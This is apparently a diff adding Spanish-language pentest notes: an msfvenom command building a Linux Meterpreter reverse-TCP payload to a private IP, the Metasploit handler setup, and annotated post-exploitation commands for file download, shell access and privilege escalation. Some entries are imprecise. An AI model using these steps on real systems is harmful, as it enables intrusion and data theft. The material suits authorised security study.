@@ -1,0 +1,64 @@
+# Genareación del Linux (Linux Ubuntu 26.04 LTS)
+msfvenom -p linux/x64/meterpreter_reverse_tcp lhost=10.10.0.1 lport=4444 -f elf -o payload
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# MSFconsole (Listener)
+use exploit/multi/handler [TYPE]
+set payload linux/x64/meterpreter_reverse_tcp [PAYLOAD]
+set LHOST 10.10.0.1 [IP_ADDRESS]
+set LPORT 4444 [PORT]
+exploit -j [RUN MULTIPLE PAYLOADS IN BACKGROUND]
+
+# MeterpreterSession
+
+sessions -l [LIST SESSIONS]
+sessions -i [SESSION NUMBER]
+sessions -K [KILL SESSION]
+
+---------------------------------------------------------------------------------------------------------------------------------
+
+# Meterpreter Commands (Linux - System Information)
+
+help → Muestra todos los comandos disponibles en Meterpreter.
+sysinfo → Muestra información del sistema Linux (distro, kernel, arquitectura).
+getuid → Muestra el usuario actual del proceso.
+getpid → Muestra el ID del proceso donde se ejecuta Meterpreter.
+getenv → Muestra variables de entorno del sistema.
+
+# Meterpreter Commands (Linux - File System)
+
+pwd → Muestra el directorio actual.
+ls → Lista archivos y directorios.
+cd → Cambia de directorio.
+cat → Muestra contenido de archivos.
+download → Descarga archivos del sistema comprometido.
+upload → Sube archivos al sistema.
+search → Busca archivos en el sistema.
+
+# Meterpreter Commands (Linux - Execution)
+
+shell → Abre una shell del sistema Linux.
+execute → Ejecuta comandos en el sistema.
+run → Ejecuta módulos internos de Meterpreter.
+
+# Meterpreter Commands (Linux - Network)
+
+ifconfig → Muestra interfaces de red.
+ipconfig → (alias en algunos sistemas) información de red.
+netstat → Muestra conexiones activas.
+route → Muestra tabla de rutas.
+
+# Meterpreter Commands (Linux - Sessions)
+
+background → Envía la sesión a segundo plano.
+sessions → Lista sesiones activas.
+sessions -i <id> → Interactúa con una sesión.
+exit → Cierra Meterpreter.
+
+# Meterpreter Commands (Linux - Privileges)
+
+getsystem → Intenta escalar privilegios (depende de configuración).
+getuid → Muestra usuario actual.
+whoami → Identidad del usuario en el sistema.
+sudo -l → (vía shell) permisos sudo disponibles.
